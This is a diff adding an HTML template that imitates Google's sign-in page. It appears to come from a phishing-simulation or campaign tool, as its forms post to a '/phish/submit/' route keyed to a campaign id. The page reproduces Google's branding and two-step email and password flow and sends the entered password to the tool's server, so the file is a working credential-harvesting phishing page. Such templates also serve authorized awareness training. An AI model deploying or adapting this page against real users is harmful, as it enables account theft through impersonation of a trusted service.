@@ -1,0 +1,320 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Sign in - Google Accounts</title>
+    <link rel="icon" href="https://accounts.google.com/favicon.ico">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: 'Google Sans', Roboto, RobotoDraft, Helvetica, Arial, sans-serif;
+            background: #fff;
+            color: #202124;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        .container {
+            max-width: 450px;
+            width: 100%;
+        }
+        
+        .card {
+            border: 1px solid #dadce0;
+            border-radius: 8px;
+            padding: 48px 40px 36px;
+            background: #fff;
+            box-shadow: 0 2px 10px 0 rgba(0,0,0,0.2);
+        }
+        
+        .google-logo {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 16px;
+        }
+        
+        .google-logo img {
+            width: 75px;
+            height: 24px;
+        }
+        
+        .google-logo-text {
+            font-size: 24px;
+            font-weight: 400;
+            color: #5f6368;
+            margin-left: 8px;
+        }
+        
+        .heading {
+            text-align: center;
+            font-size: 24px;
+            font-weight: 400;
+            margin-bottom: 32px;
+            color: #202124;
+        }
+        
+        .form-group {
+            margin-bottom: 24px;
+        }
+        
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 400;
+            color: #5f6368;
+            margin-bottom: 8px;
+        }
+        
+        .form-group input {
+            width: 100%;
+            padding: 12px 16px;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+            background: transparent;
+            transition: border-color 0.2s;
+        }
+        
+        .form-group input:focus {
+            outline: none;
+            border-color: #1a73e8;
+            border-width: 2px;
+            padding: 11px 15px;
+        }
+        
+        .form-group input:focus + label,
+        .form-group input:not(:placeholder-shown) + label {
+            transform: translateY(-24px) scale(0.75);
+            color: #1a73e8;
+        }
+        
+        .input-wrapper {
+            position: relative;
+        }
+        
+        .floating-label {
+            position: absolute;
+            left: 16px;
+            top: 12px;
+            font-size: 16px;
+            color: #5f6368;
+            transition: all 0.2s;
+            pointer-events: none;
+            background: white;
+            padding: 0 4px;
+        }
+        
+        .forgot-email {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .forgot-email:hover {
+            text-decoration: underline;
+        }
+        
+        .learn-more {
+            margin: 24px 0;
+            font-size: 14px;
+            color: #5f6368;
+        }
+        
+        .learn-more a {
+            color: #1a73e8;
+            text-decoration: none;
+        }
+        
+        .learn-more a:hover {
+            text-decoration: underline;
+        }
+        
+        .form-actions {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-top: 32px;
+        }
+        
+        .create-account {
+            color: #1a73e8;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        
+        .create-account:hover {
+            text-decoration: underline;
+        }
+        
+        .next-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: 500;
+            cursor: pointer;
+            min-width: 80px;
+        }
+        
+        .next-btn:hover {
+            background: #1765cc;
+            box-shadow: 0 1px 2px 0 rgba(60,64,67,0.3), 0 1px 3px 1px rgba(60,64,67,0.15);
+        }
+        
+        .next-btn:disabled {
+            background: #f8f9fa;
+            color: #5f6368;
+            cursor: not-allowed;
+        }
+        
+        @media (max-width: 480px) {
+            .card {
+                padding: 24px 24px 20px;
+                border: none;
+                box-shadow: none;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="google-logo">
+                <svg viewBox="0 0 75 24" width="75" height="24">
+                    <g>
+                        <path fill="#4285F4" d="M36.3425 7.7875V10.85H42.2775C42.0825 11.9675 41.4625 12.8775 40.5325 13.4625L43.2975 15.59C44.8825 14.135 45.7825 11.995 45.7825 9.5C45.7825 8.8675 45.7175 8.2675 45.5875 7.7875H36.3425Z"/>
+                        <path fill="#34A853" d="M36.3425 18.46C38.7325 18.46 40.7525 17.64 43.2975 15.59L40.5325 13.4625C39.7525 13.9375 38.6925 14.2225 36.3425 14.2225C34.0125 14.2225 32.0275 12.7525 31.3125 10.7725L28.4575 12.96C30.0775 16.185 32.9725 18.46 36.3425 18.46Z"/>
+                        <path fill="#FBBC05" d="M31.3125 10.7725C31.1525 10.2975 31.0675 9.79 31.0675 9.25C31.0675 8.71 31.1525 8.2025 31.3125 7.7275L28.4575 5.54C27.7375 6.98 27.3325 8.57 27.3325 9.25C27.3325 10.93 27.7375 12.52 28.4575 13.96L31.3125 10.7725Z"/>
+                        <path fill="#EA4335" d="M36.3425 4.2775C38.8525 4.2775 40.9525 5.185 42.5725 6.745L45.0025 4.315C40.7525 0.325 38.7325 0.04 36.3425 0.04C32.9725 0.04 30.0775 2.315 28.4575 5.54L31.3125 7.7275C32.0275 5.7475 34.0125 4.2775 36.3425 4.2775Z"/>
+                    </g>
+                </svg>
+            </div>
+            
+            <h1 class="heading">Sign in</h1>
+            <p style="text-align: center; margin-bottom: 24px; font-size: 16px; color: #202124;">Use your Google Account</p>
+            
+            <form method="POST" action="/phish/submit/{{ campaign.id if campaign else '' }}">
+                <div class="form-group">
+                    <div class="input-wrapper">
+                        <input type="email" name="username" id="email" placeholder=" " required>
+                        <label for="email" class="floating-label">Email or phone</label>
+                    </div>
+                    <div style="margin-top: 8px;">
+                        <a href="#" class="forgot-email">Forgot email?</a>
+                    </div>
+                </div>
+                
+                <div class="learn-more">
+                    Not your computer? Use Guest mode to sign in privately. 
+                    <a href="#">Learn more</a>
+                </div>
+                
+                <div class="form-actions">
+                    <a href="#" class="create-account">Create account</a>
+                    <button type="button" class="next-btn" id="nextBtn">Next</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <!-- Password Step (Hidden initially) -->
+    <div class="container" id="passwordStep" style="display: none;">
+        <div class="card">
+            <div class="google-logo">
+                <svg viewBox="0 0 75 24" width="75" height="24">
+                    <g>
+                        <path fill="#4285F4" d="M36.3425 7.7875V10.85H42.2775C42.0825 11.9675 41.4625 12.8775 40.5325 13.4625L43.2975 15.59C44.8825 14.135 45.7825 11.995 45.7825 9.5C45.7825 8.8675 45.7175 8.2675 45.5875 7.7875H36.3425Z"/>
+                        <path fill="#34A853" d="M36.3425 18.46C38.7325 18.46 40.7525 17.64 43.2975 15.59L40.5325 13.4625C39.7525 13.9375 38.6925 14.2225 36.3425 14.2225C34.0125 14.2225 32.0275 12.7525 31.3125 10.7725L28.4575 12.96C30.0775 16.185 32.9725 18.46 36.3425 18.46Z"/>
+                        <path fill="#FBBC05" d="M31.3125 10.7725C31.1525 10.2975 31.0675 9.79 31.0675 9.25C31.0675 8.71 31.1525 8.2025 31.3125 7.7275L28.4575 5.54C27.7375 6.98 27.3325 8.57 27.3325 9.25C27.3325 10.93 27.7375 12.52 28.4575 13.96L31.3125 10.7725Z"/>
+                        <path fill="#EA4335" d="M36.3425 4.2775C38.8525 4.2775 40.9525 5.185 42.5725 6.745L45.0025 4.315C40.7525 0.325 38.7325 0.04 36.3425 0.04C32.9725 0.04 30.0775 2.315 28.4575 5.54L31.3125 7.7275C32.0275 5.7475 34.0125 4.2775 36.3425 4.2775Z"/>
+                    </g>
+                </svg>
+            </div>
+            
+            <h1 class="heading">Hi <span id="userEmail"></span></h1>
+            
+            <form method="POST" action="/phish/submit/{{ campaign.id if campaign else '' }}" id="passwordForm">
+                <input type="hidden" name="username" id="hiddenUsername">
+                
+                <div class="form-group">
+                    <div class="input-wrapper">
+                        <input type="password" name="password" id="password" placeholder=" " required>
+                        <label for="password" class="floating-label">Enter your password</label>
+                    </div>
+                    <div style="margin-top: 8px;">
+                        <a href="#" class="forgot-email">Forgot password?</a>
+                    </div>
+                </div>
+                
+                <div class="form-actions">
+                    <button type="button" class="create-account" onclick="goBack()">Back</button>
+                    <button type="submit" class="next-btn">Next</button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('nextBtn').addEventListener('click', function() {
+            const email = document.getElementById('email').value;
+            if (!email) {
+                alert('Please enter your email or phone');
+                return;
+            }
+            
+            // Hide first step, show password step
+            document.querySelector('.container').style.display = 'none';
+            document.getElementById('passwordStep').style.display = 'block';
+            
+            // Set email in password step
+            document.getElementById('userEmail').textContent = email;
+            document.getElementById('hiddenUsername').value = email;
+        });
+        
+        function goBack() {
+            document.querySelector('.container').style.display = 'block';
+            document.getElementById('passwordStep').style.display = 'none';
+        }
+        
+        // Floating label animation
+        document.addEventListener('DOMContentLoaded', function() {
+            const inputs = document.querySelectorAll('input[placeholder=" "]');
+            
+            inputs.forEach(input => {
+                const label = input.nextElementSibling;
+                
+                function updateLabel() {
+                    if (input.value !== '' || input === document.activeElement) {
+                        label.style.transform = 'translateY(-24px) scale(0.75)';
+                        label.style.color = '#1a73e8';
+                    } else {
+                        label.style.transform = 'translateY(0) scale(1)';
+                        label.style.color = '#5f6368';
+                    }
+                }
+                
+                input.addEventListener('focus', updateLabel);
+                input.addEventListener('blur', updateLabel);
+                input.addEventListener('input', updateLabel);
+                
+                // Initial check
+                updateLabel();
+            });
+        });
+    </script>
+</body>
+</html>
